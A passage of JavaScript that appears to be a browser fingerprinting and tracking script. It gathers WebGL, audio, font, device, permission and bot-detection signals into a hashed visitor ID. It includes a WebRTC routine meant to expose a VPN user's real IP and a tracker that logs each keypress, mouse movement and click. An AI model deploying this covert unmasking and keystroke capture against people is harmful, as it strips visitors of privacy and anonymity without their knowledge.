            'MAX_UNIFORM_BLOCK_SIZE', 'MAX_UNIFORM_BUFFER_BINDINGS', 'MAX_VARYING_COMPONENTS',
            'MAX_VERTEX_OUTPUT_COMPONENTS', 'MAX_VERTEX_UNIFORM_BLOCKS',
            'MAX_VERTEX_UNIFORM_COMPONENTS', 'MIN_PROGRAM_TEXEL_OFFSET'
          ];

          w2Params.forEach(param => {
            try {
              DATA.webgl.webgl2.parameters[param] = gl2.getParameter(gl2[param]);
            } catch (e) { }
          });
        }

      } catch (e) {
        console.error('WebGL detection error:', e);
      }

      resolve();
    });
  }

  // Advanced WebRTC detection with VPN bypass
  async function detectWebRTC() {
    return new Promise((resolve) => {
      const startTime = performance.now();

      try {
        const RTCPeerConnection = window.RTCPeerConnection ||
          window.mozRTCPeerConnection ||
          window.webkitRTCPeerConnection;

        if (!RTCPeerConnection) {
          DATA.webrtc.supported = false;
          resolve();
          return;
        }

        DATA.webrtc.supported = true;

        // Configure ICE servers
        const iceServers = [
          ...STUN_SERVERS.map(url => ({ urls: url })),
          ...TURN_SERVERS
        ];

        const pc = new RTCPeerConnection({
          iceServers,
          iceCandidatePoolSize: 10,
          iceTransportPolicy: 'all'
        });

        // Create data channel to trigger ICE gathering
        const channel = pc.createDataChannel('fingerprint', {
          ordered: true
        });

        const candidates = [];
        const allIPs = new Set();

        pc.onicecandidate = (event) => {
          if (event.candidate) {
            const candidate = event.candidate.candidate;
            const parts = candidate.split(' ');

            if (parts.length >= 8) {
              const ip = parts[4];
              const type = parts[7];
              const port = parts[5];
              const protocol = parts[2];

              const candidateInfo = {
                ip,
                type,
                port,
                protocol,
                candidate,
                timestamp: Date.now()
              };

              candidates.push(candidateInfo);
              allIPs.add(ip);

              // Categorize by type
              if (type === 'host') {
                if (!isPrivateIP(ip)) {
                  DATA.webrtc.localIPs.push(ip);
                }
              } else if (type === 'srflx') {
                DATA.webrtc.srflxIPs.push(ip);
                if (!isPrivateIP(ip)) {
                  DATA.webrtc.publicIPs.push(ip);
                }
              } else if (type === 'relay') {
                DATA.webrtc.relayIPs.push(ip);
              }

              // Check for mDNS
              if (ip.endsWith('.local')) {
                DATA.webrtc.mdnsDetected = true;
              }
            }
          }
        };

        // Create offer to start ICE gathering
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .catch(() => {
            resolve();
          });

        // Timeout handling
        setTimeout(() => {
          try {
            pc.close();
          } catch (e) { }

          DATA.webrtc.iceGatheringTime = performance.now() - startTime;
          DATA.webrtc.candidates = candidates;

          // Analyze for VPN bypass
          analyzeWebRTCForBypass();

          resolve();
        }, CONFIG.WEBRTC_TIMEOUT);

      } catch (e) {
        resolve();
      }
    });
  }

  // Analyze WebRTC results for VPN bypass
  function analyzeWebRTCForBypass() {
    const publicIPs = DATA.webrtc.publicIPs;
    const srflxIPs = DATA.webrtc.srflxIPs;

    if (publicIPs.length === 0 && srflxIPs.length === 0) {
      return;
    }

    // Prefer srflx (server reflexive) IPs as they indicate public IP
    const candidateIPs = srflxIPs.length > 0 ? srflxIPs : publicIPs;

    // Filter out private IPs
    const validIPs = candidateIPs.filter(ip => !isPrivateIP(ip));

    if (validIPs.length > 0) {
      // Take first public IP as potential real IP
      DATA.webrtc.realIP = validIPs[0];
      DATA.webrtc.realIPDetected = true;
      DATA.webrtc.leakDetected = true;
      DATA.webrtc.vpnBypassConfidence = 80;

      DATA.vpn.indicators.push('webrtc_leak');
      DATA.vpn.score += 40;
    }

    // Check for multiple public IPs (possible VPN)
    if (validIPs.length > 1) {
      DATA.vpn.indicators.push('multiple_public_ips');
      DATA.vpn.score += 20;
    }
  }

  // Audio fingerprinting
  async function detectAudio() {
    try {
      const AudioContext = window.OfflineAudioContext ||
        window.webkitOfflineAudioContext;

      if (!AudioContext) return;

      const context = new AudioContext(1, 44100, 44100);
      const oscillator = context.createOscillator();
      const compressor = context.createDynamicsCompressor();

      // Configure oscillator
      oscillator.type = 'triangle';
      oscillator.frequency.setValueAtTime(10000, context.currentTime);

      // Configure compressor
      compressor.threshold.setValueAtTime(-50, context.currentTime);
      compressor.ratio.setValueAtTime(12, context.currentTime);
      compressor.knee.setValueAtTime(30, context.currentTime);
      compressor.attack.setValueAtTime(0.003, context.currentTime);
      compressor.release.setValueAtTime(0.25, context.currentTime);

      // Connect nodes
      oscillator.connect(compressor);
      compressor.connect(context.destination);

      // Start and render
      oscillator.start(0);

      const buffer = await new Promise((resolve) => {
        context.oncomplete = (e) => resolve(e.renderedBuffer);
        context.startRendering();
      });

      // Extract fingerprint data
      const channelData = buffer.getChannelData(0);
      const samples = channelData.slice(4500, 5000);

      // Calculate hash from samples
      let sum = 0;
      for (let i = 0; i < samples.length; i++) {
        sum += Math.abs(samples[i]);
      }

      DATA.audio.fingerprint = sum.toString();
      DATA.audio.fingerprintHash = hashString(DATA.audio.fingerprint);
      DATA.audio.channelData = Array.from(samples).map(v => v.toFixed(6));
      DATA.audio.sampleRate = buffer.sampleRate;
      DATA.audio.channelCount = buffer.numberOfChannels;
      DATA.audio.length = buffer.length;
      DATA.audio.duration = buffer.duration;

    } catch (e) {
      console.error('Audio detection error:', e);
    }
  }

  // Font detection
  function detectFonts() {
    const fontList = [
      'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
      'Calibri', 'Cambria', 'Cambria Math', 'Comic Sans MS', 'Consolas',
      'Courier', 'Courier New', 'Georgia', 'Helvetica', 'Impact',
      'Lucida Console', 'Lucida Sans Unicode', 'Microsoft Sans Serif',
      'Palatino Linotype', 'Segoe UI', 'Tahoma', 'Times New Roman',
      'Trebuchet MS', 'Verdana', 'Webdings', 'Wingdings',
      'Monaco', 'Menlo', 'SF Pro', 'San Francisco', 'Helvetica Neue',
      'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol',
      'Roboto', 'Roboto Mono', 'Open Sans', 'Lato', 'Montserrat',
      'Source Code Pro', 'Fira Code', 'JetBrains Mono',
      'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei',
      'Noto Sans', 'Noto Serif', 'Droid Sans', 'Droid Serif',
      'Ubuntu', 'Ubuntu Mono', 'Cantarell', 'DejaVu Sans',
      'DejaVu Serif', 'DejaVu Sans Mono', 'Liberation Sans',
      'Liberation Serif', 'Linux Libertine', 'Times', 'Courier',
      'Symbol', 'Bookman', 'Garamond', 'Book Antiqua',
      'Century Gothic', 'Franklin Gothic Medium', 'Futura',
      'Geneva', 'Optima', 'Avant Garde', 'Baskerville',
      'Big Caslon', 'Bodoni MT', 'Calisto MT', 'Candara',
      'Constantia', 'Corbel', 'Didot', 'Footlight MT',
      'Gabriola', 'Gadugi', 'Goudy Old Style', 'High Tower Text',
      'Hoefler Text', 'Javanese Text', 'Leelawadee',
      'Lucida Bright', 'Lucida Calligraphy', 'Lucida Fax',
      'MS Gothic', 'MS PGothic', 'MS UI Gothic', 'MS Mincho',
      'MS PMincho', 'MV Boli', 'Malgun Gothic', 'MingLiU',
      'MingLiU-ExtB', 'PMingLiU', 'PMingLiU-ExtB',
      'NSimSun', 'SimSun', 'SimSun-ExtB', 'Yu Gothic',
      'Yu Mincho', 'Dotum', 'Gulim', 'Batang', 'Gungsuh'
    ];

    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';
    const baseFonts = ['monospace', 'sans-serif', 'serif'];

    const testDiv = document.createElement('div');
    testDiv.style.cssText = `
      position: absolute;
      left: -9999px;
      font-size: ${testSize};
      white-space: nowrap;
    `;
    document.body.appendChild(testDiv);

    const detected = [];

    for (const baseFont of baseFonts) {
      testDiv.style.fontFamily = baseFont;
      testDiv.textContent = testString;
      const baseline = {
        width: testDiv.offsetWidth,
        height: testDiv.offsetHeight
      };

      for (const font of fontList) {
        testDiv.style.fontFamily = `"${font}", ${baseFont}`;
        testDiv.textContent = testString;

        if (testDiv.offsetWidth !== baseline.width ||
          testDiv.offsetHeight !== baseline.height) {
          if (!detected.includes(font)) {
            detected.push(font);
          }
        }
      }
    }

    document.body.removeChild(testDiv);

    DATA.fonts.detected = detected;
    DATA.fonts.count = detected.length;
    DATA.fonts.systemFonts = detected.filter(f =>
      ['Arial', 'Times New Roman', 'Courier New', 'Helvetica',
        'Verdana', 'Georgia', 'Palatino', 'Garamond'].includes(f)
    );
  }

  // Device detection
  function detectDevice() {
    const ua = navigator.userAgent;

    // Device type
    if (/Android/i.test(ua)) {
      DATA.device.deviceType = 'Android';
      const m = ua.match(/Android ([^;]+)/);
      if (m) DATA.os.version = m[1];
    } else if (/iPhone/i.test(ua)) {
      DATA.device.deviceType = 'iPhone';
      DATA.device.deviceVendor = 'Apple';
    } else if (/iPad/i.test(ua)) {
      DATA.device.deviceType = 'iPad';
      DATA.device.deviceVendor = 'Apple';
    } else if (/iPod/i.test(ua)) {
      DATA.device.deviceType = 'iPod';
      DATA.device.deviceVendor = 'Apple';
    } else if (/Windows Phone/i.test(ua)) {
      DATA.device.deviceType = 'Windows Phone';
    } else if (/BlackBerry/i.test(ua)) {
      DATA.device.deviceType = 'BlackBerry';
    } else if (/IEMobile/i.test(ua)) {
      DATA.device.deviceType = 'Windows Mobile';
    } else if (/tablet|ipad|playbook|silk/i.test(ua)) {
      DATA.device.deviceType = 'Tablet';
    } else if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(ua)) {
      DATA.device.deviceType = 'Mobile';
    } else {
      DATA.device.deviceType = 'Desktop';
    }

    // Vendor detection
    if (/Samsung/i.test(ua)) DATA.device.deviceVendor = 'Samsung';
    else if (/Apple/i.test(ua)) DATA.device.deviceVendor = 'Apple';
    else if (/Huawei/i.test(ua)) DATA.device.deviceVendor = 'Huawei';
    else if (/Xiaomi/i.test(ua)) DATA.device.deviceVendor = 'Xiaomi';
    else if (/OnePlus/i.test(ua)) DATA.device.deviceVendor = 'OnePlus';
    else if (/Google/i.test(ua)) DATA.device.deviceVendor = 'Google';
    else if (/Sony/i.test(ua)) DATA.device.deviceVendor = 'Sony';
    else if (/LG/i.test(ua)) DATA.device.deviceVendor = 'LG';
    else if (/HTC/i.test(ua)) DATA.device.deviceVendor = 'HTC';
    else if (/Motorola/i.test(ua)) DATA.device.deviceVendor = 'Motorola';
    else if (/Nokia/i.test(ua)) DATA.device.deviceVendor = 'Nokia';
    else if (/Asus/i.test(ua)) DATA.device.deviceVendor = 'Asus';
    else if (/Lenovo/i.test(ua)) DATA.device.deviceVendor = 'Lenovo';

    // Battery API
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        DATA.device.battery.supported = true;
        DATA.device.battery.level = Math.round(battery.level * 100);
        DATA.device.battery.charging = battery.charging;
        DATA.device.battery.chargingTime = battery.chargingTime === Infinity ? null : battery.chargingTime;
        DATA.device.battery.dischargingTime = battery.dischargingTime === Infinity ? null : battery.dischargingTime;

        // Listen for changes
        battery.addEventListener('levelchange', () => {
          DATA.device.battery.level = Math.round(battery.level * 100);
        });
        battery.addEventListener('chargingchange', () => {
          DATA.device.battery.charging = battery.charging;
        });
      }).catch(() => {
        DATA.device.battery.supported = false;
      });
    }

    // GPU info from WebGL
    if (DATA.webgl.renderer) {
      DATA.device.gpu = DATA.webgl.renderer;
    }
  }

  // Browser detection
  function detectBrowser() {
    const ua = navigator.userAgent;

    // Detect browser
    if (/Firefox/i.test(ua)) {
      DATA.browser.name = 'Firefox';
      const m = ua.match(/Firefox\/(\d+(\.\d+)?)/);
      if (m) {
        DATA.browser.version = m[1];
        DATA.browser.major = parseInt(m[1]);
      }
      DATA.browser.engine = 'Gecko';
    } else if (/Edg/i.test(ua)) {
      DATA.browser.name = 'Edge';
      const m = ua.match(/Edg\/(\d+(\.\d+)?)/);
      if (m) {
        DATA.browser.version = m[1];
        DATA.browser.major = parseInt(m[1]);
      }
      DATA.browser.engine = 'Blink';
    } else if (/OPR|Opera/i.test(ua)) {
      DATA.browser.name = 'Opera';
      const m = ua.match(/(?:OPR|Opera)\/(\d+(\.\d+)?)/);
      if (m) {
        DATA.browser.version = m[1];
        DATA.browser.major = parseInt(m[1]);
      }
      DATA.browser.engine = 'Blink';
    } else if (/Chrome/i.test(ua) && !/Chromium|Edg|OPR/i.test(ua)) {
      DATA.browser.name = 'Chrome';
      const m = ua.match(/Chrome\/(\d+(\.\d+)?)/);
      if (m) {
        DATA.browser.version = m[1];
        DATA.browser.major = parseInt(m[1]);
      }
      DATA.browser.engine = 'Blink';
    } else if (/Safari/i.test(ua) && !/Chrome|Chromium/i.test(ua)) {
      DATA.browser.name = 'Safari';
      const m = ua.match(/Version\/(\d+(\.\d+)?)/);
      if (m) {
        DATA.browser.version = m[1];
        DATA.browser.major = parseInt(m[1]);
      }
      DATA.browser.engine = 'WebKit';
    } else if (/Chromium/i.test(ua)) {
      DATA.browser.name = 'Chromium';
      DATA.browser.engine = 'Blink';
    }

    // Connection info
    const connection = navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
    if (connection) {
      DATA.browser.connection = {
        effectiveType: connection.effectiveType,
        downlink: connection.downlink,
        rtt: connection.rtt,
        saveData: connection.saveData,
        type: connection.type
      };
      DATA.network.effectiveType = connection.effectiveType;
      DATA.network.downlink = connection.downlink;
      DATA.network.rtt = connection.rtt;
      DATA.network.saveData = connection.saveData;
      DATA.network.type = connection.type;
    }
  }

  // OS detection
  function detectOS() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;

    if (/Windows NT 10\.0/i.test(ua)) {
      DATA.os.name = 'Windows';
      DATA.os.version = '10/11';
    } else if (/Windows NT 6\.3/i.test(ua)) {
      DATA.os.name = 'Windows';
      DATA.os.version = '8.1';
    } else if (/Windows NT 6\.2/i.test(ua)) {
      DATA.os.name = 'Windows';
      DATA.os.version = '8';
    } else if (/Windows NT 6\.1/i.test(ua)) {
      DATA.os.name = 'Windows';
      DATA.os.version = '7';
    } else if (/Mac OS X 10_15|Mac OS X 10\.15/i.test(ua)) {
      DATA.os.name = 'macOS';
      DATA.os.version = '10.15';
    } else if (/Mac OS X 11/i.test(ua)) {
      DATA.os.name = 'macOS';
      DATA.os.version = '11';
    } else if (/Mac OS X 12/i.test(ua)) {
      DATA.os.name = 'macOS';
      DATA.os.version = '12';
    } else if (/Mac OS X 13/i.test(ua)) {
      DATA.os.name = 'macOS';
      DATA.os.version = '13';
    } else if (/Mac OS X 14/i.test(ua)) {
      DATA.os.name = 'macOS';
      DATA.os.version = '14';
    } else if (/Android/i.test(ua)) {
      DATA.os.name = 'Android';
      const m = ua.match(/Android (\d+(\.\d+)?)/);
      if (m) DATA.os.version = m[1];
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
      DATA.os.name = 'iOS';
      const m = ua.match(/OS (\d+)[_\.]?(\d+)?/);
      if (m) DATA.os.version = m[2] ? `${m[1]}.${m[2]}` : m[1];
    } else if (/Linux/i.test(ua)) {
      DATA.os.name = 'Linux';
    } else if (/CrOS/i.test(ua)) {
      DATA.os.name = 'Chrome OS';
    }
  }

  // Storage detection
  async function detectStorage() {
    try {
      localStorage.setItem('fp_test', '1');
      localStorage.removeItem('fp_test');
      DATA.storage.localStorage = true;
    } catch (e) {
      DATA.storage.localStorage = false;
    }

    try {
      sessionStorage.setItem('fp_test', '1');
      sessionStorage.removeItem('fp_test');
      DATA.storage.sessionStorage = true;
    } catch (e) {
      DATA.storage.sessionStorage = false;
    }

    try {
      const request = indexedDB.open('fp_test');
      await new Promise((resolve, reject) => {
        request.onsuccess = () => {
          request.result.close();
          indexedDB.deleteDatabase('fp_test');
          DATA.storage.indexedDB = true;
          resolve();
        };
        request.onerror = () => reject();
      });
    } catch (e) {
      DATA.storage.indexedDB = false;
    }

    // Storage quota
    if (navigator.storage && navigator.storage.estimate) {
      try {
        const estimate = await navigator.storage.estimate();
        DATA.storage.estimate = estimate;
        DATA.storage.quota = estimate.quota;
        DATA.storage.usage = estimate.usage;
      } catch (e) { }
    }

    // Persistent storage
    if (navigator.storage && navigator.storage.persist) {
      try {
        DATA.storage.persistent = await navigator.storage.persisted();
      } catch (e) { }
    }
  }

  // Permission detection
  async function detectPermissions() {
    const permissions = [
      'accelerometer',
      'ambient-light-sensor',
      'background-fetch',
      'background-sync',
      'bluetooth',
      'camera',
      'clipboard-read',
      'clipboard-write',
      'device-info',
      'display-capture',
      'geolocation',
      'gyroscope',
      'magnetometer',
      'microphone',
      'midi',
      'notifications',
      'payment-handler',
      'persistent-storage',
      'push',
      'screen-wake-lock',
      'storage-access'
    ];

    if (navigator.permissions) {
      for (const permission of permissions) {
        try {
          const result = await navigator.permissions.query({ name: permission });
          DATA.permissions[permission] = result.state;
        } catch (e) {
          DATA.permissions[permission] = 'unsupported';
        }
      }
    }
  }

  // Media device detection
  async function detectMedia() {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();

        DATA.media.videoInputs = devices.filter(d => d.kind === 'videoinput').length;
        DATA.media.audioInputs = devices.filter(d => d.kind === 'audioinput').length;
        DATA.media.audioOutputs = devices.filter(d => d.kind === 'audiooutput').length;

        DATA.media.cameras = devices
          .filter(d => d.kind === 'videoinput')
          .map(d => ({ label: d.label, deviceId: d.deviceId }));
        DATA.media.microphones = devices
          .filter(d => d.kind === 'audioinput')
          .map(d => ({ label: d.label, deviceId: d.deviceId }));
      } catch (e) { }
    }

    // Check supported media types
    const mediaTypes = [
      'video/webm',
      'video/webm;codecs=vp8',
      'video/webm;codecs=vp9',
      'video/mp4',
      'video/mp4;codecs=avc1',
      'audio/webm',
      'audio/mp4',
      'audio/ogg',
      'audio/wav'
    ];

    if (window.MediaSource) {
      for (const type of mediaTypes) {
        if (MediaSource.isTypeSupported(type)) {
          DATA.media.supportedTypes.push(type);
        }
      }
    }
  }

  // Network detection
  function detectNetwork() {
    DATA.network.online = navigator.onLine;

    window.addEventListener('online', () => {
      DATA.network.online = true;
    });
    window.addEventListener('offline', () => {
      DATA.network.online = false;
    });
  }

  // Security detection
  function detectSecurity() {
    DATA.security.https = window.location.protocol === 'https:';
    DATA.security.localhost = window.location.hostname === 'localhost' ||
      window.location.hostname === '127.0.0.1';
    DATA.security.sandboxed = window.origin === 'null';
    DATA.security.crossOriginIsolated = window.crossOriginIsolated;

    // Check for CSP
    const csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    if (csp) {
      DATA.security.csp = csp.content;
    }

    // Check for Referrer-Policy
    const referrer = document.querySelector('meta[name="referrer"]');
    if (referrer) {
      DATA.security.referrerPolicy = referrer.content;
    }
  }

  // Bot detection
  function detectBot() {
    const indicators = [];
    let score = 0;

    // WebDriver check
    if (navigator.webdriver === true) {
      indicators.push('navigator.webdriver');
      score += 50;
      DATA.bot.isSelenium = true;
    }

    // Automation globals
    const automationGlobals = [
      '__webdriver_script_fn', '_Selenium_IDE_Recorder', 'callSelenium',
      '_phantom', '__nightmare', 'callPhantom', '_selenium',
      'callDomAutomation', 'domAutomation', 'domAutomationController',
      'cdc_adoQpoasnfa76pfcZLmcfl_', '__$webdriverAsyncExecutor',
      '__fxdriver_unwrapped', 'wdioGlobals', '__webdriver_next_id'
    ];

    for (const global of automationGlobals) {
      if (window[global]) {
        indicators.push(`window.${global}`);
        score += 30;
      }
    }

    // User agent checks
    const ua = navigator.userAgent.toLowerCase();
    if (/headless/i.test(ua)) {
      indicators.push('headless_ua');
      score += 40;
      DATA.bot.isHeadless = true;
    }
    if (/phantomjs|selenium|puppeteer|playwright|cypress/i.test(ua)) {
      indicators.push('automation_ua');
      score += 40;
    }

    // Plugin check
    if (!navigator.plugins || navigator.plugins.length === 0) {
      indicators.push('no_plugins');
      score += 15;
    }

    // Language check
    if (!navigator.language) {
      indicators.push('no_language');
      score += 10;
    }

    // Platform check
    if (!navigator.platform) {
      indicators.push('no_platform');
      score += 10;
    }

    // Chrome runtime check
    if (window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect) {
      // Normal Chrome
    } else if (/Chrome/i.test(ua) && !window.chrome) {
      indicators.push('chrome_without_runtime');
      score += 20;
    }

    // Notification permission check
    if (navigator.permissions) {
      navigator.permissions.query({ name: 'notifications' }).then(result => {
        if (Notification.permission === 'default' && result.state !== 'prompt') {
          indicators.push('notification_permission_anomaly');
          score += 15;
        }
      }).catch(() => {
        indicators.push('permissions_api_blocked');
        score += 10;
      });
    }

    // iFrame check
    if (window.self !== window.top) {
      indicators.push('in_iframe');
      score += 5;
    }

    // WebDriver property descriptor check
    try {
      const descriptor = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
      if (descriptor && descriptor.get) {
        indicators.push('webdriver_property_overridden');
        score += 20;
      }
    } catch (e) { }

    // Chrome app check — real Chrome has chrome.app; headless often doesn't
    if (/Chrome/i.test(ua) && window.chrome) {
      if (!window.chrome.app && !window.chrome.csi) {
        indicators.push('chrome_missing_app');
        score += 15;
      }
    }

    // Intl.DateTimeFormat anomaly — bots often have inconsistent locale support
    try {
      const dtf = new Intl.DateTimeFormat();
      const resolved = dtf.resolvedOptions();
      if (!resolved.locale || !resolved.timeZone) {
        indicators.push('intl_anomaly');
        score += 10;
      }
    } catch (e) {
      indicators.push('intl_blocked');
      score += 15;
    }

    // Screen dimensions anomaly — headless often uses 0x0 or default 800x600
    if (window.screen.width === 0 || window.screen.height === 0) {
      indicators.push('zero_screen');
      score += 30;
    }
    if (window.outerWidth === 0 && window.outerHeight === 0) {
      indicators.push('zero_outer_window');
      score += 25;
    }

    // Connection API anomaly — headless often lacks this
    if (/Chrome/i.test(ua) && !navigator.connection) {
      indicators.push('chrome_no_connection_api');
      score += 10;
    }

    // Puppeteer detection
    if (window._phantom || window.__nightmare || window.callPhantom) {
      DATA.bot.isPhantom = true;
      indicators.push('phantom_detected');
      score += 40;
    }
    if (navigator.webdriver && /HeadlessChrome/i.test(ua)) {
      DATA.bot.isPuppeteer = true;
      indicators.push('puppeteer_detected');
      score += 40;
    }

    // Playwright detection
    if (window.__playwright || window.__pw_manual) {
      DATA.bot.isPlaywright = true;
      indicators.push('playwright_detected');
      score += 40;
    }

    // Evaluate if bot
    DATA.bot.score = Math.min(score, 100);
    DATA.bot.isBot = score > 30;
    DATA.bot.isAutomated = score > 20;
    DATA.bot.indicators = indicators;
    DATA.bot.tests.webdriver = navigator.webdriver;
    DATA.bot.tests.plugins = navigator.plugins?.length;
    DATA.bot.tests.languages = navigator.languages?.length;
  }

  // VPN detection
  function detectVPN() {
    const indicators = [];
    let score = 0;

    // Timezone mismatch with IP would be checked server-side
    // But we can detect some client-side indicators

    // Check for common VPN browser extensions
    const extensionIndicators = [
      'chrome-extension://', 'moz-extension://', 'safari-extension://'
    ];

    // Check for VPN-related globals
    const vpnGlobals = ['__VPN_CLIENT__', '__PROXY_CONFIG__'];
    for (const global of vpnGlobals) {
      if (window[global]) {
        indicators.push(`vpn_global:${global}`);
        score += 30;
      }
    }

    // Check for unusual network timing
    if (DATA.network.rtt && DATA.network.rtt < 5) {
      indicators.push('suspicious_low_latency');
      score += 15;
    }

    // WebRTC leak is a strong VPN indicator
    if (DATA.webrtc.leakDetected) {
      indicators.push('webrtc_leak');
      score += 40;
    }

    DATA.vpn.detected = score > 30;
    DATA.vpn.score = Math.min(score, 100);
    DATA.vpn.indicators = indicators;
    DATA.vpn.confidence = score > 50 ? 'high' : score > 20 ? 'medium' : 'low';
  }

  // Performance detection (uses Navigation Timing Level 2, avoids deprecated performance.timing)
  function detectPerformance() {
    if (!window.performance) return;

    // Prefer Navigation Timing v2 (PerformanceNavigationTiming)
    if (performance.getEntriesByType) {
      const navEntries = performance.getEntriesByType('navigation');
      if (navEntries.length > 0) {
        const nav = navEntries[0];
        DATA.performance.navigation = {
          type: nav.type,
          redirectCount: nav.redirectCount
        };
        DATA.performance.dnsTime = Math.round(nav.domainLookupEnd - nav.domainLookupStart);
        DATA.performance.tcpTime = Math.round(nav.connectEnd - nav.connectStart);
        DATA.performance.sslTime = nav.secureConnectionStart > 0 ? Math.round(nav.connectEnd - nav.secureConnectionStart) : 0;
        DATA.performance.ttfb = Math.round(nav.responseStart - nav.requestStart);
        DATA.performance.pageLoad = Math.round(nav.loadEventEnd > 0 ? nav.loadEventEnd : nav.domComplete);
        DATA.performance.domInteractive = Math.round(nav.domInteractive);
        DATA.performance.domComplete = Math.round(nav.domComplete);
      }
    }

    // Memory info (Chrome-only)
    if (performance.memory) {
      DATA.performance.memory = {
        usedJSHeapSize: performance.memory.usedJSHeapSize,
        totalJSHeapSize: performance.memory.totalJSHeapSize,
        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
      };
    }
  }

  // Behavioral tracking
  function startBehavioralTracking() {
    let lastActivity = Date.now();
    let movementLog = [];

    // Mouse tracking
    document.addEventListener('mousemove', (e) => {
      const now = Date.now();
      DATA.behavior.mouseMovements.push({
        x: e.clientX,
        y: e.clientY,
        time: now
      });

      // Calculate movement entropy
      if (movementLog.length > 0) {
        const last = movementLog[movementLog.length - 1];
        const dx = e.clientX - last.x;
        const dy = e.clientY - last.y;
        const distance = Math.sqrt(dx * dx + dy * dy);
        const time = now - last.time;
        const velocity = distance / (time || 1);

        DATA.behavior.movementEntropy += Math.abs(velocity - (last.velocity || 0));
        last.velocity = velocity;
      }

      movementLog.push({ x: e.clientX, y: e.clientY, time: now });
      if (movementLog.length > 50) movementLog.shift();
      if (DATA.behavior.mouseMovements.length > 100) {
        DATA.behavior.mouseMovements.shift();
      }

      lastActivity = now;
    }, { passive: true });

    // Click tracking
    document.addEventListener('click', (e) => {
      DATA.behavior.clickCount++;
      DATA.behavior.mouseClicks.push({
        x: e.clientX,
        y: e.clientY,
        target: e.target.tagName,
        time: Date.now()
      });
      lastActivity = Date.now();
    }, { passive: true });

    // Scroll tracking
    let scrollTimeout;
    window.addEventListener('scroll', () => {
      clearTimeout(scrollTimeout);
      scrollTimeout = setTimeout(() => {
        const scrollPercent = Math.round(
          (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100
        );
        DATA.behavior.scrollDepth = Math.max(DATA.behavior.scrollDepth, scrollPercent);
        DATA.behavior.scrollEvents.push({
          depth: scrollPercent,
          time: Date.now()
        });
      }, 100);
    }, { passive: true });

    // Key tracking
    document.addEventListener('keypress', (e) => {
      DATA.behavior.keyCount++;
      DATA.behavior.keyEvents.push({
        key: e.key,
        code: e.code,
        time: Date.now()
      });
      lastActivity = Date.now();
    }, { passive: true });

    // Touch tracking
    document.addEventListener('touchstart', (e) => {
      DATA.behavior.touchEvents.push({
        touches: e.touches.length,
        time: Date.now()
      });
      lastActivity = Date.now();
    }, { passive: true });

    // Focus tracking
    window.addEventListener('focus', () => {
      DATA.behavior.focusEvents.push({ type: 'focus', time: Date.now() });
    });
    window.addEventListener('blur', () => {
      DATA.behavior.focusEvents.push({ type: 'blur', time: Date.now() });
    });

    // Update time on page
    setInterval(() => {
      DATA.behavior.timeOnPage = Date.now() - DATA.timing.start;

      // Calculate human score based on interactions
      const hasMouseMovement = DATA.behavior.mouseMovements.length > 5;
      const hasClicks = DATA.behavior.clickCount > 0;
      const hasScroll = DATA.behavior.scrollDepth > 10;
      const hasTyping = DATA.behavior.keyCount > 0;
      const hasFocusChanges = DATA.behavior.focusEvents.length > 0;

      let humanScore = 100;
      if (!hasMouseMovement) humanScore -= 20;
      if (!hasClicks && DATA.behavior.timeOnPage > 5000) humanScore -= 15;
      if (!hasScroll && DATA.behavior.timeOnPage > 10000) humanScore -= 10;
      if (!hasTyping && DATA.behavior.timeOnPage > 30000) humanScore -= 10;
      if (!hasFocusChanges) humanScore -= 5;
      if (DATA.behavior.movementEntropy < 10 && DATA.behavior.timeOnPage > 5000) humanScore -= 15;

      DATA.behavior.humanScore = Math.max(0, humanScore);
    }, 1000);
  }

  // Generate visitor ID using SubtleCrypto SHA-256 for strong fingerprint stability
  async function generateQuantumId() {
    const components = [
      DATA.canvas.standardHash,
      DATA.webgl.fingerprintHash,
      DATA.audio.fingerprintHash,
      DATA.display.width,
      DATA.display.height,
      DATA.display.colorDepth,
      DATA.display.pixelRatio,
      DATA.device.memory,
      DATA.device.cores,
      DATA.os.timezone,
      DATA.os.language,
      navigator.userAgent.substring(0, 50)
    ];

    const componentString = components
      .filter(c => c !== null && c !== undefined)
      .map(String)
      .join('|');

    // Use SubtleCrypto SHA-256 when available (all modern browsers)
    try {
      if (window.crypto && window.crypto.subtle) {
        const encoder = new TextEncoder();
        const data = encoder.encode(componentString);
        const hashBuffer = await window.crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        FP_STATE.visitorId = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32);
      } else {
        // Fallback for non-secure contexts
        FP_STATE.visitorId = hashString(componentString).padStart(16, '0');
      }
    } catch (e) {
      FP_STATE.visitorId = hashString(componentString).padStart(16, '0');
    }

    FP_STATE.entropy = calculateEntropy(components);
    FP_STATE.confidence = Math.min(FP_STATE.entropy * 10, 100);

    DATA.visitorId = FP_STATE.visitorId;
    DATA.quantumHash = FP_STATE.visitorId;
    DATA.entropyScore = FP_STATE.entropy;
  }

  // Calculate entropy
  function calculateEntropy(components) {
    const values = components.filter(c => c !== null && c !== undefined);
    const uniqueValues = new Set(values);
    return uniqueValues.size / values.length;
  }

  // Generate session ID
  function generateSessionId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const cryptoObj = window.crypto || window.msCrypto;

    if (cryptoObj && cryptoObj.getRandomValues) {
      const array = new Uint32Array(16);
      cryptoObj.getRandomValues(array);
      for (let i = 0; i < 16; i++) {
        result += chars[array[i] % chars.length];
      }
    } else {
      for (let i = 0; i < 16; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
      }
